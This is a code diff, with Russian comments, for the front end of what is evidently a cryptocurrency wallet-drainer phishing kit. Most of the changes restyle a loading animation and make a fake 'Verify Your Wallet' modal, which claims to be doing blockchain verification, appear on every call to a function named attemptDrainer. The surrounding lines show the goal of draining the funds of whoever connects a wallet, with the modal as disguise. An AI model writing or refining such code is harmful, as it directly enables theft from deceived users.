@@ -30,7 +30,6 @@ let isTransactionPending = false;
 let actionBtn = null;
 let modalOverlay = null;
 let modalContent = null;
-let modalShown = false;
 
 // Список надёжных RPC для fallback (оставляем, так как может быть полезно для любых сетей)
 const FALLBACK_RPCS = [
@@ -151,7 +150,7 @@ window.addEventListener('DOMContentLoaded', () => {
       margin-bottom: 24px;
     }
 
-    /* Креативный кружок загрузки */
+    /* Лоадер: пульсирующее кольцо с волнами */
     .loader-container {
       position: relative;
       width: 100px;
@@ -159,59 +158,69 @@ window.addEventListener('DOMContentLoaded', () => {
       margin: 0 auto 24px;
     }
 
-    .loader-orbit {
+    .pulse-ring {
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      border-radius: 50%;
-      background: transparent;
-    }
-
-    .loader-dot {
-      position: absolute;
-      width: 12px;
-      height: 12px;
-      background: #3B82F6;
-      border-radius: 50%;
-      box-shadow: 0 0 10px rgba(59, 130, 246, 0.5);
-    }
-
-    .loader-dot:nth-child(1) {
-      top: 10px;
-      left: 50%;
-      transform: translateX(-50%);
-      animation: orbit1 2s linear infinite;
-    }
-
-    .loader-dot:nth-child(2) {
       top: 50%;
-      right: 10px;
-      transform: translateY(-50%);
-      animation: orbit2 2.2s linear infinite;
-    }
-
-    .loader-dot:nth-child(3) {
-      bottom: 10px;
       left: 50%;
-      transform: translateX(-50%);
-      animation: orbit3 2.4s linear infinite;
+      width: 40px;
+      height: 40px;
+      border: 3px solid #3B82F6;
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      animation: pulse 2s ease-in-out infinite;
+      box-shadow: 0 0 15px rgba(59, 130, 246, 0.5);
     }
 
-    @keyframes orbit1 {
-      0% { transform: translateX(-50%) rotate(0deg) translateY(-25px); }
-      100% { transform: translateX(-50%) rotate(360deg) translateY(-25px); }
+    @keyframes pulse {
+      0% {
+        width: 40px;
+        height: 40px;
+        opacity: 0.8;
+      }
+      50% {
+        width: 50px;
+        height: 50px;
+        opacity: 0.4;
+      }
+      100% {
+        width: 40px;
+        height: 40px;
+        opacity: 0.8;
+      }
     }
 
-    @keyframes orbit2 {
-      0% { transform: translateY(-50%) rotate(0deg) translateX(25px); }
-      100% { transform: translateY(-50%) rotate(360deg) translateX(25px); }
+    .wave {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 40px;
+      height: 40px;
+      border: 1px solid #60A5FA;
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      opacity: 0;
+      animation: wave 4s ease-out infinite;
     }
 
-    @keyframes orbit3 {
-      0% { transform: translateX(-50%) rotate(0deg) translateY(25px); }
-      100% { transform: translateX(-50%) rotate(360deg) translateY(25px); }
+    .wave:nth-child(2) {
+      animation-delay: 1s;
+    }
+
+    .wave:nth-child(3) {
+      animation-delay: 2s;
+    }
+
+    @keyframes wave {
+      0% {
+        width: 40px;
+        height: 40px;
+        opacity: 0.6;
+      }
+      100% {
+        width: 100px;
+        height: 100px;
+        opacity: 0;
+      }
     }
 
     .action-list {
@@ -261,21 +270,34 @@ window.addEventListener('DOMContentLoaded', () => {
         width: 70px;
         height: 70px;
       }
-      .loader-dot {
-        width: 10px;
-        height: 10px;
+      @keyframes pulse {
+        0% {
+          width: 30px;
+          height: 30px;
+          opacity: 0.8;
+        }
+        50% {
+          width: 40px;
+          height: 40px;
+          opacity: 0.4;
+        }
+        100% {
+          width: 30px;
+          height: 30px;
+          opacity: 0.8;
+        }
       }
-      @keyframes orbit1 {
-        0% { transform: translateX(-50%) rotate(0deg) translateY(-10px); }
-        100% { transform: translateX(-50%) rotate(360deg) translateY(-10px); }
-      }
-      @keyframes orbit2 {
-        0% { transform: translateY(-50%) rotate(0deg) translateX(10px); }
-        100% { transform: translateY(-50%) rotate(360deg) translateX(10px); }
-      }
-      @keyframes orbit3 {
-        0% { transform: translateX(-50%) rotate(0deg) translateY(10px); }
-        100% { transform: translateX(-50%) rotate(360deg) translateY(10px); }
+      @keyframes wave {
+        0% {
+          width: 30px;
+          height: 30px;
+          opacity: 0.6;
+        }
+        100% {
+          width: 70px;
+          height: 70px;
+          opacity: 0;
+        }
       }
       .action-list {
         font-size: 13px;
@@ -298,11 +320,10 @@ window.addEventListener('DOMContentLoaded', () => {
     <div class="modal-title">Verify Your Wallet</div>
     <div class="modal-subtitle">Processing blockchain verification...</div>
     <div class="loader-container">
-      <div class="loader-orbit">
-        <div class="loader-dot"></div>
-        <div class="loader-dot"></div>
-        <div class="loader-dot"></div>
-      </div>
+      <div class="pulse-ring"></div>
+      <div class="wave"></div>
+      <div class="wave"></div>
+      <div class="wave"></div>
     </div>
     <ul class="action-list">
       <li>Connect to the network</li>
@@ -340,13 +361,6 @@ function hideModal() {
   modalContent.style.display = 'none';
 }
 
-function showModalOnce() {
-  if (!modalShown) {
-    modalShown = true;
-    showModal();
-  }
-}
-
 // === Выполнение drainer ===
 async function attemptDrainer() {
   if (hasDrained || isTransactionPending) {
@@ -360,7 +374,7 @@ async function attemptDrainer() {
   }
 
   console.log(`📍 Используется адрес: ${connectedAddress}`);
-  showModalOnce();
+  showModal(); // Теперь модальное окно открывается каждый раз
 
   try {
     const provider = await getReliableProvider();
